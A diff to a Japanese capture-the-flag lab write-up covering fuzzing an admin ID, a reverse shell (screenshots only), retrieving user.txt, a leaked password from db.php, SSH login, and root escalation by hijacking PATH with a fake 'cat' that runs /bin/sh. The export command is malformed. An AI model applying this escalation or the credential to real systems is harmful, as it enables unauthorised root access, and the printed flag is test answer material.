@@ -27,7 +27,7 @@ login用ページと思われるディレクトリを発見
 
 ![50060c167b817853f9591ce6145a313e.png](../_resources/50060c167b817853f9591ce6145a313e.png)
 
-## 3 Fuzzing
+# 3.Fuzzing
 ## admin info
 右図赤枠の箇所でファジングを実施
 
@@ -38,7 +38,7 @@ ID=1がadminであることを確認
 ![c3415e527202f0309347b802d9ed8978.png](../_resources/c3415e527202f0309347b802d9ed8978.png)
 
 
-## .4 Revers shell
+## Revers shell
 下図赤枠内パラメータをアドミンの物に変更
 
 ![ba2b093e44d88550f531741c9934726a.png](../_resources/ba2b093e44d88550f531741c9934726a.png)
@@ -60,3 +60,51 @@ kaliのデフォルトについてるリバースシェルの下図赤枠内を�
 
 ![6bcdd8fe55f595fa01cd68931123965f.png](../_resources/6bcdd8fe55f595fa01cd68931123965f.png)
 
+
+![f62c2cd0941e9c9da144bc0d25034347.png](../_resources/f62c2cd0941e9c9da144bc0d25034347.png)
+
+# 5. Use flag Get
+サーバ内のuser.txtを検索
+
+$ find / -name *user.txt* 2> /dev/null
+$ cd /home/robert/
+$ ls
+$ cat user.txt
+
+![0edfe3217b29b18377779dfc17ba6397.png](../_resources/0edfe3217b29b18377779dfc17ba6397.png)
+
+root.txtがあると思われるディレクリを発見したが権限が無い為アクセスできない。
+
+![9c8e26e622039954556ee5c91fc490cf.png](../_resources/9c8e26e622039954556ee5c91fc490cf.png)
+
+user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+M3g4C0rpUs3r!
+db.php内のユーザ情報を取得
+
+![3addcc654d858a5d6e304b64fba7629f.png](../_resources/3addcc654d858a5d6e304b64fba7629f.png)
+
+
+# 6.SSH connect
+ `ssh robert@$ip`
+ 
+ SSHを使いrobertユーザで接続
+ 
+ ![390a02dd703ddf2bc96b56b66b8e4849.png](../_resources/390a02dd703ddf2bc96b56b66b8e4849.png)
+
+権限昇格に使用できると思われるツールを発見
+
+![54ea79e33302eb51168b56b83b5b19ab.png](../_resources/54ea79e33302eb51168b56b83b5b19ab.png)
+
+Bug Trackerは/root/reportsディレクリ内にcatを使用することを確認
+![f5982646e76314fb6222c9e8a0486f5e.png](../_resources/f5982646e76314fb6222c9e8a0486f5e.png)
+
+catに"bin/sh"を入れrootまでのパスを設定する
+$ cd /tmp
+$ echo "/bin/sh" > cat
+$ chmod +x cat  
+$ export PATH/tmp:PATH
+$ echo PATH
+$ bugtracker
+
+![0804246115a2505a54b5914b879cab38.png](../_resources/0804246115a2505a54b5914b879cab38.png)
